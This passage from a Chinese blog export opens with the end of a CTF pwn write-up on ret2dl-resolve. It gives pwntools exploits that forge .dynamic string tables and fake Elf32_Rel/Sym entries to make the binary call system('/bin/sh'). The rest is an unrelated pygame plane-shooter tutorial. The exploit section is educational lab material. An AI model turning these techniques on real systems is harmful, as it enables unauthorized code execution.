sh.send(<span class="built_in">chr</span>(idx))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#伪造的字符串表，(0x457-0x3f8)刚好是&quot;free\x00&quot;字符串的偏移</span></span><br><span class="line">payload = <span class="string">&quot;C&quot;</span> * (<span class="number">0x457</span>-<span class="number">0x3f8</span>) + <span class="string">&quot;system\x00&quot;</span></span><br><span class="line"><span class="comment">#先新建两个notes</span></span><br><span class="line">add(<span class="string">&quot;/bin/sh\x00&quot;</span> + <span class="string">&quot;A&quot;</span> * <span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">&quot;/bin/sh\x00&quot;</span> + <span class="string">&quot;B&quot;</span> * <span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#溢出时尽量保证堆块不被破坏，不过这里不会再做堆的操作了其实也无所谓</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&quot;/bin/sh\x00&quot;</span> + <span class="string">&quot;A&quot;</span> * <span class="number">0x10</span> + p64(<span class="number">33</span>) + p64(<span class="number">0x18</span>) + p64(<span class="number">0x601EB0</span>))</span><br><span class="line"><span class="comment">#将0x601EB0，即.dynamic的字符串表指针，写成0x6020C8</span></span><br><span class="line">edit(<span class="number">1</span>, p64(<span class="number">0x6020C8</span>))</span><br><span class="line"> </span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&quot;/bin/sh\x00&quot;</span> + <span class="string">&quot;A&quot;</span> * <span class="number">0x10</span> + p64(<span class="number">33</span>) + p64(<span class="number">0x18</span>) + p64(<span class="number">0x6020C8</span>))</span><br><span class="line"><span class="comment">#在0x6020C8处写入伪造的字符串表</span></span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#会第一次调用free，所以实际上是system(&quot;/bin/sh&quot;)被调用，如前面所说</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>我个人觉得这题最难的是分析吧，一开始，一方面是我堆接触的少，但是这个add note 之后chunk的嵌套我觉得还蛮坑的，以后看的多了应该就好了</p>
<p>这里后面的edit中的p64(33)+p64(0x18)只是为了尽可能的保持堆块不被破坏，维持add时的size大小，然后把数据改为了dynamic的字符串表指针</p>
<p>这样我们再编辑chunk1的时候，编辑的就是dynamic的字符串表指针了，如下</p>
<p><img src="https://img-blog.csdnimg.cn/20190218214642894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTkyNjcy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>改成了bss字段上的数据，但是我们虽然可以控制bss字段上的数据，但是字段上的数据我们还没改，所以我们需要再overflow一次，来吧chunk1的数据改成我们可控的bss字段地址，然后再往里面写上我们的payload，然后就可以执行我们想要的了</p>
<p>这一切都是基于.dynamic可写，直接改string table 从而把写入got表的内容改为我们所需要的</p>
<h2 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h2><p>可总有我们修改不了.dynamic，有时候一个简单的partial relro就足以让人感到头大</p>
<p>我们也都知道上文中那个0（puts）其实是我们的rel table 的参数，我们可以操纵第二个参数，使其指向我们所构造的Elf32_Rel</p>
<p>例题还是拿原博主的吧，写的真的很适合小白看</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+0h] [ebp-6Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+18h] [ebp-54h]</span></span><br><span class="line">  <span class="keyword">int</span> *v5; <span class="comment">// [esp+64h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = &amp;a1;</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, <span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v4, <span class="number">0</span>, <span class="number">0x4C</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  write(<span class="number">1</span>, buf, v1);</span><br><span class="line">  read_overflow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数流程超级简单，就是一个栈溢出，没开canary保护，但是我们无法修改.dynamic</p>
<p>先直接上exp，慢慢调试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">g_local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">ROP_SIZE = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">LEAVE_RETN = <span class="number">0x0804851D</span></span><br><span class="line">BUFFER = <span class="number">0x804AE50</span></span><br><span class="line">NEXT_ROP = BUFFER - ROP_SIZE</span><br><span class="line">READ_ADDR = <span class="number">0x080483A0</span></span><br><span class="line">STRLEN_GOT = <span class="number">0x804A014</span></span><br><span class="line"></span><br><span class="line">FAKE_SYM_ADDR = BUFFER + <span class="number">8</span></span><br><span class="line">SYMTAB_ADDR = <span class="number">0x080481D8</span></span><br><span class="line">SIZEOF_SYM = <span class="number">0x10</span></span><br><span class="line">FAKE_SYMTAB_IDX = (((FAKE_SYM_ADDR-SYMTAB_ADDR)/SIZEOF_SYM) &lt;&lt; <span class="number">8</span>) + <span class="number">7</span></span><br><span class="line"></span><br><span class="line">STRTAB_ADDR = <span class="number">0x08048278</span></span><br><span class="line">SYSTEM_ADDR = BUFFER + <span class="number">0x18</span></span><br><span class="line">BIN_SH_ADDR = SYSTEM_ADDR + <span class="number">7</span></span><br><span class="line">FAKE_STR_OFF = SYSTEM_ADDR-STRTAB_ADDR</span><br><span class="line"></span><br><span class="line">REL_ADDR = <span class="number">0x8048330</span></span><br><span class="line">FAKE_REL = BUFFER</span><br><span class="line">FAKE_REL_OFF = FAKE_REL - REL_ADDR</span><br><span class="line"></span><br><span class="line">DYN_RESOL_PLT = <span class="number">0x08048380</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> g_local:</span><br><span class="line">	sh = process(<span class="string">&#x27;./32.out&#x27;</span>)<span class="comment">#env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;</span></span><br><span class="line">	gdb.attach(sh)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	sh = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&quot;A&quot;</span> * <span class="number">108</span></span><br><span class="line">payload1 += p32(NEXT_ROP)</span><br><span class="line">payload1 += p32(READ_ADDR)</span><br><span class="line">payload1 += p32(LEAVE_RETN)</span><br><span class="line">payload1 += p32(<span class="number">0</span>)</span><br><span class="line">payload1 += p32(BUFFER - ROP_SIZE)</span><br><span class="line">payload1 += p32(<span class="number">0x100</span>)</span><br><span class="line">payload1 += <span class="string">&quot;P&quot;</span> * (<span class="number">0x100</span> - <span class="built_in">len</span>(payload1))</span><br><span class="line">sh.send(payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#at BUFFER = 0x804A050</span></span><br><span class="line"></span><br><span class="line">fake_Elf32_Rel = p32(STRLEN_GOT)</span><br><span class="line">fake_Elf32_Rel += p32(FAKE_SYMTAB_IDX)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_Elf32_Sym = p32(FAKE_STR_OFF)</span><br><span class="line">fake_Elf32_Sym += p32(<span class="number">0</span>)</span><br><span class="line">fake_Elf32_Sym += p32(<span class="number">0</span>)</span><br><span class="line">fake_Elf32_Sym += <span class="built_in">chr</span>(<span class="number">0x12</span>) + <span class="built_in">chr</span>(<span class="number">0</span>) + p16(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">strings = <span class="string">&quot;system\x00/bin/sh\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line">rop = p32(<span class="number">0</span>)</span><br><span class="line">rop += p32(DYN_RESOL_PLT)</span><br><span class="line">rop += p32(FAKE_REL_OFF)</span><br><span class="line">rop += <span class="string">&quot;AAAA&quot;</span></span><br><span class="line">rop += p32(BIN_SH_ADDR)</span><br><span class="line"></span><br><span class="line">payload2 = rop + fake_Elf32_Rel + fake_Elf32_Sym + strings</span><br><span class="line"></span><br><span class="line">sh.send(payload2)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Python_飞机大作战</title>
    <url>/2019/03/17/Python-%E9%A3%9E%E6%9C%BA%E5%A4%A7%E4%BD%9C%E6%88%98/</url>
    <content><![CDATA[<p>算是个很经典的小项目，一直没做过，补一下</p>
<span id="more"></span>

<h3 id="创建一个窗口"><a href="#创建一个窗口" class="headerlink" title="创建一个窗口"></a>创建一个窗口</h3><p>这里用了一些pygame的库函数，之前没接触过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. pygame.display</span><br><span class="line">1)set_mode(resolution=(0,0), flags=0, depth=0) -&gt; Surface\nInitialize a window or screen for display</span><br><span class="line">初始化窗口函数，resolution代表着是分辨率，我们上述图片选择的是480*852的图片，所以resolution应该填（480,852），第二个参数flags如果你传递的参数为0，或者无标志参数,他默认的为软件驱动窗口，大多数的情况我们选择为0，第三个参数depth表示用于颜色的位数，默认为0，我们可以通过调整参数让背景色暗色一点</span><br><span class="line"></span><br><span class="line">2)update(rectangle=None) -&gt; None\nupdate(rectangle_list) -&gt; None\nUpdate portions of the screen for software displays</span><br><span class="line">更新一下surface</span><br><span class="line"></span><br><span class="line">3)screen.blit(myImage, pos, srcRect, 0)</span><br><span class="line">第一个参数是源Surface对象，pos则是传送到screen的左上角的位置，是一个二元组，表示xy坐标， srcRect表示的是一个矩形四元组，是将myImage中srcRect这个矩形的区域传送到screen上来</span><br><span class="line"></span><br><span class="line">总体而言最基本的就是，创建surface对象，准备一个背景图片，再surface添加图片后更新一下</span><br></pre></td></tr></table></figure>

<p>我们现在创建一个surface，摆上我们的背景图</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 创建窗口</span></span><br><span class="line">    screen = pygame.display.set_mode((<span class="number">480</span>, <span class="number">700</span>))</span><br><span class="line">    <span class="comment"># 创建一个背景图片</span></span><br><span class="line">    background = pygame.image.load(<span class="string">&#x27;./images/background.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 显示到屏幕</span></span><br><span class="line">        screen.blit(background, (<span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        pygame.display.update()</span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3 id="创建玩家的飞机"><a href="#创建玩家的飞机" class="headerlink" title="创建玩家的飞机"></a>创建玩家的飞机</h3><p>我们不光要把飞机弄好，还要把上下左右移动的监听写好</p>
<p>飞机的类还是简单的，如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeroPlane</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, screen_temp</span>):</span></span><br><span class="line">        self.x = <span class="number">220</span></span><br><span class="line">        self.y = <span class="number">650</span></span><br><span class="line">        self.screen = screen_temp  <span class="comment"># 游戏窗口</span></span><br><span class="line">        self.image = pygame.image.load(<span class="string">&#x27;images/life.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">display</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.screen.blit(self.image, (self.x, self.y))   <span class="comment"># 加载玩家飞机到窗口</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">move_left</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.x -= <span class="number">5</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">move_right</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.x += <span class="number">5</span></span><br></pre></td></tr></table></figure>

<p>然后上下左右怎么监听，我去特地搜了一下pygame是怎么做的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. pygame.event</span><br><span class="line">先列举一下常用的事件列表</span><br><span class="line">QUIT,ACTIVEEVENT,KEYUP,KEYDOWN,MOUSEMOTION,MOUSEBUTTONUP,MOUSEBUTTONDOWN,JOYAXISMOTION,JOYBALLMOTION,JOYHATMOTION</span><br><span class="line">KEYDOWN是个按键的总事件，里面可以选择监听道德是否为某一个键，比如，K_a就是A键</span><br><span class="line">1) pygame.event.get </span><br><span class="line">获取监听到的事件</span><br><span class="line">2）event.type == QUIT</span><br><span class="line">就是surface的大叉键</span><br></pre></td></tr></table></figure>

<p>接下来我们的飞机就可以左右移动啦</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pygame.<span class="built_in">locals</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeroPlane</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, screen_temp</span>):</span></span><br><span class="line">        self.x = <span class="number">220</span></span><br><span class="line">        self.y = <span class="number">650</span></span><br><span class="line">        self.screen = screen_temp  <span class="comment"># 游戏窗口</span></span><br><span class="line">        self.image = pygame.image.load(<span class="string">&#x27;images/life.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">display</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.screen.blit(self.image, (self.x, self.y))   <span class="comment"># 加载玩家飞机到窗口</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">move_left</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.x -= <span class="number">5</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">move_right</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.x += <span class="number">5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_control</span>(<span class="params">hero_temp</span>):</span></span><br><span class="line">    <span class="comment"># 获取事件，比如按键等</span></span><br><span class="line">    <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">        <span class="comment"># 判断是否是点击了退出按钮</span></span><br><span class="line">        <span class="keyword">if</span> event.<span class="built_in">type</span> == QUIT:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;exit&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="comment"># 判断是否是按下了键</span></span><br><span class="line">        <span class="keyword">elif</span> event.<span class="built_in">type</span> == KEYDOWN:</span><br><span class="line">            <span class="comment"># 检测按键是否是a或者left</span></span><br><span class="line">            <span class="keyword">if</span> event.key == K_a <span class="keyword">or</span> event.key == K_LEFT:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line">                hero_temp.move_left()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 检测按键是否是d或者right</span></span><br><span class="line">            <span class="keyword">elif</span> event.key == K_d <span class="keyword">or</span> event.key == K_RIGHT:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;right&#x27;</span>)</span><br><span class="line">                hero_temp.move_right()</span><br><span class="line">            <span class="comment"># 检测按键是否是空格键</span></span><br><span class="line">            <span class="keyword">elif</span> event.key == K_SPACE:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;space&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 创建窗口</span></span><br><span class="line">    screen = pygame.display.set_mode((<span class="number">480</span>, <span class="number">700</span>))</span><br><span class="line">    <span class="comment"># 创建一个背景图片</span></span><br><span class="line">    background = pygame.image.load(<span class="string">&#x27;images/background.png&#x27;</span>)</span><br><span class="line">    <span class="comment"># 创建一个飞机对象</span></span><br><span class="line">    hero = HeroPlane(screen)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 显示到屏幕</span></span><br><span class="line">        screen.blit(background, (<span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="comment"># 显示玩家飞机到定义的（x,y）坐标位置</span></span><br><span class="line">        hero.display()</span><br><span class="line">        pygame.display.update()</span><br><span class="line">        <span class="comment"># 检测键盘，控制玩家飞机移动</span></span><br><span class="line">        key_control(hero)</span><br><span class="line">        time.sleep(<span class="number">0.02</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3 id="制作发射子弹"><a href="#制作发射子弹" class="headerlink" title="制作发射子弹"></a>制作发射子弹</h3><p>之前的空格键就是用来发射子弹的，我们给子弹重新创建一个类是比较好的选择</p>
<p>直接看完整代码就好，目前已经可以发射子弹了，其实就是在之前的基础上加了一点</p>
<p>这里还需要判断子弹越界就消失，不过这个小游戏里面改不改我觉得无伤大雅，但我自己还是写了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pygame.<span class="built_in">locals</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeroPlane</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, screen_temp</span>):</span></span><br><span class="line">        self.x = <span class="number">220</span></span><br><span class="line">        self.y = <span class="number">650</span></span><br><span class="line">        self.screen = screen_temp  <span class="comment"># 游戏窗口</span></span><br><span class="line">        self.image = pygame.image.load(<span class="string">&#x27;images/life.png&#x27;</span>)</span><br><span class="line">        self.bullet_list = []  <span class="comment"># 存储发射出去的子弹</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">display</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.screen.blit(self.image, (self.x, self.y))   <span class="comment"># 加载玩家飞机到窗口</span></span><br><span class="line">        <span class="keyword">for</span> bullet <span class="keyword">in</span> self.bullet_list:</span><br><span class="line">            bullet.display()</span><br><span class="line">            bullet.move()</span><br><span class="line">            <span class="keyword">if</span> bullet.judge():  <span class="comment"># 判断子弹是否越界</span></span><br><span class="line">                self.bullet_list.remove(bullet)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">move_left</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.x -= <span class="number">5</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">move_right</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.x += <span class="number">5</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fire</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.bullet_list.append(Bullet(self.screen, self.x, self.y))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bullet</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, screen_temp, x, y</span>):</span></span><br><span class="line">        self.x = x + <span class="number">20</span></span><br><span class="line">        self.y = y - <span class="number">20</span></span><br><span class="line">        self.screen = screen_temp</span><br><span class="line">        self.image = pygame.image.load(<span class="string">&#x27;images/bullet1.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">display</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.screen.blit(self.image, (self.x, self.y))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">move</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.y -= <span class="number">20</span></span><br><span class="line">    </span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">judge</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.y &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_control</span>(<span class="params">hero_temp</span>):</span></span><br><span class="line">    <span class="comment"># 获取事件，比如按键等</span></span><br><span class="line">    <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">        <span class="comment"># 判断是否是点击了退出按钮</span></span><br><span class="line">        <span class="keyword">if</span> event.<span class="built_in">type</span> == QUIT:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;exit&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="comment"># 判断是否是按下了键</span></span><br><span class="line">        <span class="keyword">elif</span> event.<span class="built_in">type</span> == KEYDOWN:</span><br><span class="line">            <span class="comment"># 检测按键是否是a或者left</span></span><br><span class="line">            <span class="keyword">if</span> event.key == K_a <span class="keyword">or</span> event.key == K_LEFT:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line">                hero_temp.move_left()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 检测按键是否是d或者right</span></span><br><span class="line">            <span class="keyword">elif</span> event.key == K_d <span class="keyword">or</span> event.key == K_RIGHT:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;right&#x27;</span>)</span><br><span class="line">                hero_temp.move_right()</span><br><span class="line">            <span class="comment"># 检测按键是否是空格键</span></span><br><span class="line">            <span class="keyword">elif</span> event.key == K_SPACE:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;space&#x27;</span>)</span><br><span class="line">                hero_temp.fire()  <span class="comment"># 开火</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 创建窗口</span></span><br><span class="line">    screen = pygame.display.set_mode((<span class="number">480</span>, <span class="number">700</span>))</span><br><span class="line">    <span class="comment"># 创建一个背景图片</span></span><br><span class="line">    background = pygame.image.load(<span class="string">&#x27;images/background.png&#x27;</span>)</span><br><span class="line">    <span class="comment"># 创建一个飞机对象</span></span><br><span class="line">    hero = HeroPlane(screen)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 显示到屏幕</span></span><br><span class="line">        screen.blit(background, (<span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="comment"># 显示玩家飞机到定义的（x,y）坐标位置</span></span><br><span class="line">        hero.display()</span><br><span class="line">        pygame.display.update()</span><br><span class="line">        <span class="comment"># 检测键盘，控制玩家飞机移动</span></span><br><span class="line">        key_control(hero)</span><br><span class="line">        time.sleep(<span class="number">0.02</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3 id="创建敌机"><a href="#创建敌机" class="headerlink" title="创建敌机"></a>创建敌机</h3><p>没有对手是孤独的，没有条件就创造条件</p>
<p>这里创建一个敌机的类还是轻松的，左右移动也是老样子，只不过直接规定一个出事的默认移动方向就好，然后在初步定义一个判断何时改变运动轨迹的条件即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 敌机的class</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EnemyPlane</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, screen_temp</span>):</span></span><br><span class="line">        self.x = <span class="number">0</span></span><br><span class="line">        self.y = <span class="number">0</span></span><br><span class="line">        self.screen = screen_temp</span><br><span class="line">        self.image = pygame.image.load(<span class="string">&#x27;images/enemy1.png&#x27;</span>)</span><br><span class="line">        self.direction = <span class="string">&#x27;right&#x27;</span>  <span class="comment"># 定义敌机默认往右移动</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">display</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.screen.blit(self.image, (self.x, self.y))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">move</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.direction == <span class="string">&#x27;right&#x27;</span>:</span><br><span class="line">            self.x += <span class="number">8</span></span><br><span class="line">        <span class="keyword">elif</span> self.direction == <span class="string">&#x27;left&#x27;</span>:</span><br><span class="line">            self.x -= <span class="number">8</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.x &gt; <span class="number">430</span>:</span><br><span class="line">            self.direction = <span class="string">&#x27;left&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> self.x &lt; <span class="number">0</span>:</span><br><span class="line">            self.direction = <span class="string">&#x27;right&#x27;</span></span><br><span class="line"> </span><br><span class="line">………………</span><br><span class="line"><span class="comment"># 如今的main函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 创建窗口</span></span><br><span class="line">    screen = pygame.display.set_mode((<span class="number">480</span>, <span class="number">700</span>))</span><br><span class="line">    <span class="comment"># 创建一个背景图片</span></span><br><span class="line">    background = pygame.image.load(<span class="string">&#x27;images/background.png&#x27;</span>)</span><br><span class="line">    <span class="comment"># 创建一个飞机对象</span></span><br><span class="line">    hero = HeroPlane(screen)</span><br><span class="line">    <span class="comment"># 创建一个敌机</span></span><br><span class="line">    enemy = EnemyPlane(screen)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 显示到屏幕</span></span><br><span class="line">        screen.blit(background, (<span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="comment"># 显示玩家飞机到定义的（x,y）坐标位置</span></span><br><span class="line">        hero.display()</span><br><span class="line">        <span class="comment"># 显示敌机</span></span><br><span class="line">        enemy.display()</span><br><span class="line">        enemy.move()</span><br><span class="line">        pygame.display.update()</span><br><span class="line">        <span class="comment"># 检测键盘，控制玩家飞机移动</span></span><br><span class="line">        key_control(hero)</span><br><span class="line">        time.sleep(<span class="number">0.02</span>)</span><br></pre></td></tr></table></figure>

<p>以上部分完成后会出现一个自动移动的敌机，接下来我们给敌机添加子弹</p>
<p>其实还是差不多的，之后为了好看点，我换了点子弹的图片而已，现在一个没有任何歼灭敌机以及爆炸效果的破产游戏就诞生了，完整代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> pygame.<span class="built_in">locals</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeroPlane</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, screen_temp</span>):</span></span><br><span class="line">        self.x = <span class="number">220</span></span><br><span class="line">        self.y = <span class="number">650</span></span><br><span class="line">        self.screen = screen_temp  <span class="comment"># 游戏窗口</span></span><br><span class="line">        self.image = pygame.image.load(<span class="string">&#x27;images/life.png&#x27;</span>)</span><br><span class="line">        self.bullet_list = []  <span class="comment"># 存储发射出去的子弹</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">display</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.screen.blit(self.image, (self.x, self.y))   <span class="comment"># 加载玩家飞机到窗口</span></span><br><span class="line">        <span class="keyword">for</span> bullet <span class="keyword">in</span> self.bullet_list:</span><br><span class="line">            bullet.display()</span><br><span class="line">            bullet.move()</span><br><span class="line">            <span class="keyword">if</span> bullet.judge():  <span class="comment"># 判断子弹是否越界</span></span><br><span class="line">                